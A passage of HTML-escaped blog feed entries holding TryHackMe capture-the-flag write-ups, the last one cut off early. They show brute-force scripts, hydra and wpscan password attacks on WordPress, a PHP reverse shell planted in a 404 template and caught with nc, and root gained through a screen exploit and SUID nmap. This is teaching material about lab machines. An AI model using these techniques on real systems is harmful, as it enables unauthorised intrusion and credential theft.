&lt;h3 id=&#34;13-steganography&#34;&gt;1.3. Steganography&lt;/h3&gt;
&lt;p&gt;Exploring the image using &lt;code&gt;strings&lt;/code&gt;, &lt;code&gt;binwalk&lt;/code&gt; and &lt;code&gt;steghide&lt;/code&gt; does not return anything.&lt;/p&gt;
&lt;p&gt;At this point, one thing CTF challenges often have is the change in the magic number of the file.&lt;/p&gt;
&lt;p&gt;These magic numbers are used by the system to recognise which file it is. Using &lt;code&gt;xxd --plain thm.jpg &amp;gt; wow.txt&lt;/code&gt; we see the first line: &lt;code&gt;89504e470d0a1a0a000000010100000100010000ffdb0043000302020302&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;I looked up the &lt;a class=&#34;link&#34; href=&#34;https://www.garykessler.net/library/file_sigs.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;actual values&lt;/a&gt; for &lt;code&gt;jpg&lt;/code&gt; files. We thus change the first line to: &lt;code&gt;ffd8ffe000104a46494600010100000100010000ffdb0043000302020302&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We see the hidden directory mentioned in the image!&lt;/p&gt;
&lt;p&gt;PS: It is also a good idea to download the image &amp;hellip; just in case, you know?&lt;/p&gt;
&lt;h3 id=&#34;14-hidden-directory-exploration&#34;&gt;1.4. Hidden Directory Exploration&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/oih7N23.png&#34; alt=&#34;The hidden directory screenshot, asking for a secret number&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Info gathered:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;We have to enter a secret&lt;/li&gt;
&lt;li&gt;Source code mentions something about the type of input and the size of input.&lt;/li&gt;
&lt;li&gt;The question is thus: How do we input?&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;15-finding-the-secret&#34;&gt;1.5. Finding the Secret&lt;/h3&gt;
&lt;p&gt;Trying the below gives us an expected response. Note how the parameter is accepted.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ curl 10.10.0.237/{hidden_directory_name}/?secret=1
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
  &amp;lt;title&amp;gt;Hidden Directory&amp;lt;/title&amp;gt;
  &amp;lt;link href=&amp;quot;stylesheet.css&amp;quot; rel=&amp;quot;stylesheet&amp;quot; type=&amp;quot;text/css&amp;quot;&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
  &amp;lt;div class=&amp;quot;main&amp;quot;&amp;gt;
&amp;lt;h2&amp;gt;Welcome! I have been expecting you!&amp;lt;/h2&amp;gt;
&amp;lt;p&amp;gt;To obtain my identity you need to guess my secret! &amp;lt;/p&amp;gt;
&amp;lt;!-- It&#39;s between 0-99 but I don&#39;t think anyone will look here--&amp;gt;

&amp;lt;p&amp;gt;Secret Entered: 1&amp;lt;/p&amp;gt;

&amp;lt;p&amp;gt;That is wrong! Get outta here!&amp;lt;/p&amp;gt;

&amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We also see the hint printed out here. Time for some scripting!&lt;/p&gt;
&lt;p&gt;I wrote the below code, which you can use to brute-forcing the value of the secret parameter.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ cat script.py
import requests

url = &amp;quot;http://MACHINE_IP_HERE/{hidden_directory_name}/?secret=&amp;quot;

for i in range(100):
    curr_url = url+str(i)
    response = requests.get(curr_url)
    if response.text.find(&amp;quot;wrong&amp;quot;) == -1:
        print(i)
        break
    print(f&amp;quot;Checking {i} rn&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we get the secret number, which gets us a key!&lt;/p&gt;
&lt;p&gt;But, to what?&lt;/p&gt;
&lt;h3 id=&#34;16-steganography&#34;&gt;1.6. Steganography&lt;/h3&gt;
&lt;p&gt;Remember the image we fixed earlier? Well, this is where the key is being used.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ steghide --extract --stegofile download.jpeg 
Enter passphrase: 
wrote extracted data to &amp;quot;hidden.txt&amp;quot;.
                                                               
┌──(kali㉿kali)-[/tmp]
└─$ cat hidden.txt 
Fine you found the password! 

Here&#39;s a username 

wbxre

I didn&#39;t say I would make it easy for you!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ey, Voila! Using rot13 gives us the username.&lt;/p&gt;
&lt;p&gt;But &amp;hellip; PASSWORD????????&lt;/p&gt;
&lt;h2 id=&#34;2-foothold-finally-big-brain-time&#34;&gt;2. Foothold (finally): Big Brain Time&lt;/h2&gt;
&lt;p&gt;At this point, we have no active paths we could explore. Bruteforcing SSH is not a good idea. What to do?&lt;/p&gt;
&lt;p&gt;This is &lt;em&gt;very&lt;/em&gt; sneaky. Saw the image on the room? Download it.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ steghide --extract --stegofile f***.jpg      
Enter passphrase: 
wrote extracted data to &amp;quot;password.txt&amp;quot;.
                                                               
┌──(kali㉿kali)-[/tmp]
└─$ cat password.txt 
I didn&#39;t think you&#39;d find me! Congratulations!

Here take my password

{hidden}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;AH YES! Finally!&lt;/p&gt;
&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
&lt;p&gt;We epxlore the common paths to priv esc.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;joker@ubuntu:~$ sudo -l
[sudo] password for joker: 
Sorry, user joker may not run sudo on ubuntu.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;^not useful.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;joker@ubuntu:~$ find / -type f -perm -u=s 2&amp;gt;/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/bin/fusermount
/bin/su
/bin/ping6
/bin/screen-4.5.0
/bin/screen-4.5.0.old
/bin/mount
/bin/ping
/bin/umount
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;^finding set uid bit&lt;/p&gt;
&lt;p&gt;Does something seem off to you? I googled it, and found the &lt;a class=&#34;link&#34; href=&#34;https://www.exploit-db.com/exploits/41154&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;exploit&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Copy-pasting the script and executing -&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;joker@ubuntu:~$ vim wow.sh
joker@ubuntu:~$ bash wow.sh 
wow.sh: line 1: creenroot.sh: command not found
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function ‘dropshell’:
/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
     chmod(&amp;quot;/tmp/rootshell&amp;quot;, 04755);
     ^
/tmp/rootshell.c: In function ‘main’:
/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
     setuid(0);
     ^
/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
     setgid(0);
     ^
/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
     seteuid(0);
     ^
/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
     setegid(0);
     ^
/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
     execvp(&amp;quot;/bin/sh&amp;quot;, NULL, NULL);
     ^
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
&#39; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-joker.

# whoami
root
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;System Compromised :)&lt;/p&gt;
&lt;h2 id=&#34;lessons-learnt&#34;&gt;LESSONS LEARNT&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;For steganography challenges, look for: strings, binwalk, steghide and also magic numbers.&lt;/li&gt;
&lt;li&gt;Bruteforcing generic things is fun with python3&lt;/li&gt;
&lt;li&gt;Stuck? Take a break and look where things are most &amp;hellip; normal.&lt;/li&gt;
&lt;li&gt;Google &lt;em&gt;anything&lt;/em&gt; that looks shady.&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Mr Robot Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-mr-robot-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-mr-robot-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/gsFux0D.png" alt="Featured image of post TryHackMe: Mr Robot Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/mrrobot&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-recon&#34;&gt;1. Recon&lt;/h2&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1 Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;❯ nmap -sC -sV -A -T4 10.10.91.137
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-05 21:55 EST
Nmap scan report for 10.10.91.137
Host is up (0.31s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn&#39;t have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.55 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;12-web-enumeration&#34;&gt;1.2 Web Enumeration&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;❯ gobuster dir -u 10.10.91.137 -w &amp;quot;/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt&amp;quot; -x &amp;quot;html,php,txt&amp;quot;
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.91.137
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,txt
[+] Timeout:        10s
===============================================================
2021/03/05 21:57:18 Starting gobuster
===============================================================
/index.html (Status: 200)
/index.php (Status: 301)
/images (Status: 301)
/blog (Status: 301)
/sitemap (Status: 200)
/rss (Status: 301)
/login (Status: 302)
/0 (Status: 301)
/feed (Status: 301)
/video (Status: 301)
/image (Status: 301)
/atom (Status: 301)
/wp-content (Status: 301)
/admin (Status: 301)
/audio (Status: 301)
/intro (Status: 200)
/wp-login (Status: 200)
/wp-login.php (Status: 200)
/css (Status: 301)
/rss2 (Status: 301)
/license (Status: 200)
/license.txt (Status: 200)
/wp-includes (Status: 301)
/js (Status: 301)
/wp-register.php (Status: 301)
/Image (Status: 301)
/wp-rss2.php (Status: 301)
/rdf (Status: 301)
/page1 (Status: 301)
/readme (Status: 200)
/readme.html (Status: 200)
/robots (Status: 200)
/robots.txt (Status: 200)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;http://10.10.91.137/0/&lt;/code&gt; shows a blog page. We also see the login option, redirecting us to &lt;code&gt;/wp-login.php&lt;/code&gt;. No common creds work.&lt;/p&gt;
&lt;h3 id=&#34;13-web-exploration&#34;&gt;1.3 Web Exploration&lt;/h3&gt;
&lt;p&gt;Looking around more, we have &lt;code&gt;/license.txt&lt;/code&gt; which has &lt;code&gt;what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?&lt;/code&gt; lmao, and &lt;code&gt;/readme&lt;/code&gt; showing: &lt;code&gt;I like where you head is at. However I&#39;m not going to help you.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;However, in &lt;code&gt;/robots&lt;/code&gt;, I get:
&lt;img src=&#34;https://i.imgur.com/TkgmcyU.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Makes sense for it to be in robots, since its about Mr robot XD. Going on this theme, we get &lt;code&gt;fscoiety.dic&lt;/code&gt; which looks to be either usernames or passwords. On a whim, I decided to test the user &lt;code&gt;Elliot&lt;/code&gt; on the &lt;code&gt;/wp-login&lt;/code&gt; page. The password is obviously wrong, but renetering it for reset password, we see that its correct!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/K5nU69N.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;For obvious reasons, this fails, otherwise there would be no way to enter the box once the password is reset. Thus, we have the list, &lt;code&gt;fscoiety.dic&lt;/code&gt;, which is password list!&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s fireup &lt;code&gt;hydra&lt;/code&gt; to start with the brute-forcing attack. But we need to know how to request is sent exactly. So, &lt;code&gt;burpsuite&lt;/code&gt; time!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /wp-login.php HTTP/1.1
...

log=Elliot&amp;amp;pwd=Elliot&amp;amp;wp-submit=Log+In&amp;amp;redirect_to=http%3A%2F%2F10.10.91.137%2Fwp-admin%2F&amp;amp;testcookie=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Okay. this is how it looks. Time for bruteforcing!&lt;/p&gt;
&lt;h3 id=&#34;14-bruteforcing&#34;&gt;1.4 Bruteforcing&lt;/h3&gt;
&lt;p&gt;Use the command: &lt;code&gt;❯ hydra -l Elliot -P ../fsocity.dic 10.10.91.137 http-post-form &amp;quot;/wp-login.php:log=^USER^&amp;amp;pwd=^PWD^:The password you entered for the username&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Explaination:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;hydra&lt;/code&gt; is the tool we use (smh)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-l&lt;/code&gt; flag indicates only one username for (l)ogin. &lt;code&gt;-L&lt;/code&gt; for a list of it&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-P&lt;/code&gt; flag for a password list. &lt;code&gt;-p&lt;/code&gt; for a single password&lt;/li&gt;
&lt;li&gt;&lt;code&gt;http-post-form&lt;/code&gt; is self explainatory. it requires 3 things, separated by &lt;code&gt;:&lt;/code&gt;s
&lt;ul&gt;
&lt;li&gt;exact path to where you want to attack, in our case is &lt;code&gt;/wp-login.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;the syntax and style of &lt;code&gt;username:password&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;substring of the error message of wrong password (to thus differentiate between right and wrong)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Since this is brute-forcing, it&amp;rsquo;ll take time to execute. add &lt;code&gt;-t&lt;/code&gt; flag to specify number of threads, default being 16.&lt;/p&gt;
&lt;p&gt;At this point, I have to mention that I spent a long long time to make it work. It did not. One thing which I should have done the first was to remove duplicates. There&amp;rsquo;s also a tool called &lt;code&gt;wpscan&lt;/code&gt;. Let&amp;rsquo;s try it out.&lt;/p&gt;
&lt;h3 id=&#34;15-wpscan&#34;&gt;1.5 WPScan&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;❯ wpscan --url 10.10.91.137 -t 64 -U Elliot -P ~/Desktop/Work/Pen-Testing/fsocity.dic
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.12
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.91.137/ [10.10.91.137]
[+] Started: Sat Mar  6 00:14:02 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.91.137/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.91.137/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.cms.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/cms_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/cms_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/cms_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/cms_pingback_access

[+] The external WP-Cron seems to be enabled: http://10.10.91.137/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-cms-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.91.137/47e29f4.html, Match: &#39;wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1&#39;
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.91.137/47e29f4.html, Match: &#39;WordPress 4.3.1&#39;

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.91.137/wp-content/themes/twentyfifteen/
 | Last Updated: 2020-12-09T00:00:00.000Z
 | Readme: http://10.10.91.137/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 2.8
 | Style URL: http://10.10.91.137/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://cms.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen&#39;s simple, st...
 | Author: the WordPress team
 | Author URI: https://cms.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.91.137/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: &#39;Version: 1.3&#39;

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:03 &amp;lt;========================================================&amp;gt; (22 / 22) 100.00% Time: 00:00:03

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc Multicall against 1 user/s
[SUCCESS] - Elliot / {hmmmmmmmmmmmmmmmmmm}                                                                                                       
All Found                                                                                                                            
Progress Time: 00:00:46 &amp;lt;======                                                                      &amp;gt; (2 / 22)  9.09%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: Elliot, Password: {hmmmmmmmmmmmmmmmmmm}

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Mar  6 00:15:09 2021
[+] Requests Done: 73
[+] Cached Requests: 6
[+] Data Sent: 16.995 KB
[+] Data Received: 16.491 MB
[+] Memory used: 230.895 MB
[+] Elapsed time: 00:01:06
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I am very very impressed by the scanner. Not only did it find that &lt;code&gt;/robots.txt&lt;/code&gt; file fairly quicky, it also gave us the password in a minute!&lt;/p&gt;
&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;To get a foothold, we need to figure what we can do with &lt;code&gt;WordPress&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;WordPress 4.3.1 running Twenty Fifteen theme.&lt;/code&gt; I did not find issues with this version, that are direct in any way. What I found instead is to mess with the &lt;code&gt;404&lt;/code&gt; page.&lt;/p&gt;
&lt;p&gt;in &lt;code&gt;Appearace&amp;gt;Editor&amp;gt;404 Template&lt;/code&gt;, we get the template page for 404. Let&amp;rsquo;s put the &lt;code&gt;php-reverse-shell.php&lt;/code&gt; file in there. Find this by using the &lt;code&gt;locate&lt;/code&gt; command, or getting one from github.&lt;/p&gt;
&lt;p&gt;Save it, and have &lt;code&gt;nc&lt;/code&gt; running. Now, go to a non-existent page like &lt;code&gt;/haha&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.8.150.214] from (UNKNOWN) [10.10.91.137] 45401
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 05:27:10 up  2:34,  0 users,  load average: 0.00, 0.17, 1.85
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can&#39;t access tty; job control turned off
$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;we are in!&lt;/p&gt;
&lt;p&gt;===&lt;/p&gt;
&lt;p&gt;In &lt;code&gt;/home/robot&lt;/code&gt;,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ ls
key-2-of-3.txt
password.raw-md5
$ cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;very cute.&lt;/p&gt;
&lt;h2 id=&#34;3-priv-esc&#34;&gt;3. Priv Esc&lt;/h2&gt;
&lt;p&gt;Let&amp;rsquo;s first get a proper shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ python3 --version
Python 3.4.0
$ python3 -c &amp;quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&amp;quot;
daemon@linux:/home/robot$ 
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This looks fairly small, and no salt. Let&amp;rsquo;s use an online tool &lt;a class=&#34;link&#34; href=&#34;https://hashes.com/en/decrypt/hash&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;hashes.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;And we have the creds! (also, very nice password XD)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;daemon@linux:/home/robot$ su robot
su robot
Password: {hmmmmmmmmmmmmmmmmmm}

robot@linux:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;robot@linux:~$ sudo -l
sudo -l
[sudo] password for robot: {hmmmmmmmmmmmmmmmmmm}

Sorry, user robot may not run sudo on linux.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can get the key 2 though! So priv esc to root time!&lt;/p&gt;
&lt;p&gt;I tried getting the &lt;code&gt;linpeas.sh&lt;/code&gt; file from my machine, by setting up a &lt;code&gt;httpserver&lt;/code&gt;, but that did not work. Only other way is to manually find issues.&lt;/p&gt;
&lt;p&gt;If you have seen other priv-escs, all, or all I have seen, exploit something related to the &lt;code&gt;set-uid&lt;/code&gt; bit.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s find the files having those, using: &lt;code&gt;robot@linux:~$ find / -perm -u=s &amp;gt; /dev/null&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;robot@linux:~$ find / -perm -u=s -type f 2&amp;gt;/dev/null      
find / -perm -u=s -type f 2&amp;gt;/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;only &lt;code&gt;nmap&lt;/code&gt; looks any interesting. &lt;a class=&#34;link&#34; href=&#34;https://pentestlab.blog/category/privilege-escalation/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;This article&lt;/a&gt; explains what I am trying to replicate here.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;robot@linux:~$ nmap -V
nmap -V

nmap version 3.81 ( http://www.insecure.org/nmap/ )
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;website name as insecure :D&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;robot@linux:~$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h &amp;lt;enter&amp;gt; for help
nmap&amp;gt; ls
ls
Unknown command (ls) -- press h &amp;lt;enter&amp;gt; for help
nmap&amp;gt; !sh
!sh
# ls
ls
key-2-of-3.txt  password.raw-md5
# whoami
whoami
root
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;pwned!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Overpass Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-overpass-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-overpass-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/LPggi78.png" alt="Featured image of post TryHackMe: Overpass Writeup" /&gt;&lt;h2 id=&#34;1-recon&#34;&gt;1. Recon&lt;/h2&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1 Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;❯ nmap -sC -sV -A BOX_IP
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-02 22:56 EST
Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 49.58% done; ETC: 22:56 (0:00:23 remaining)
Stats: 0:00:41 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 66.33% done; ETC: 22:57 (0:00:20 remaining)
Nmap scan report for BOX_IP
Host is up (0.41s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.19 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;PS: you can run this with &lt;code&gt;--script=vuln&lt;/code&gt;, and that works too. But, it took this amount of time:
&lt;code&gt;Nmap done: 1 IP address (1 host up) scanned in 1216.13 seconds&lt;/code&gt;. So maybe not a good idea.&lt;/p&gt;
&lt;h3 id=&#34;12-web-enumeration&#34;&gt;1.2 Web Enumeration&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;❯ gobuster dir -u BOX_IP -w &amp;quot;/usr/share/wordlists/rockyou.txt&amp;quot; -x &amp;quot;html,php,txt&amp;quot;
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://BOX_IP
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,txt
[+] Timeout:        10s
===============================================================
2021/02/02 23:06:26 Starting gobuster
===============================================================
/index.html (Status: 301)
/img (Status: 301)
/downloads (Status: 301)
/aboutus (Status: 301)
/admin (Status: 301)
/admin.html (Status: 200)
/css (Status: 301)
Progress: 1322 / 220561 (0.60%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2021/02/02 23:12:32 Finished
===============================================================
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;13-sqli&#34;&gt;1.3 SQLI&lt;/h3&gt;
&lt;p&gt;hmmm. admin look interesting. Using &lt;code&gt;/admin.html&lt;/code&gt; gives us a login page.&lt;/p&gt;
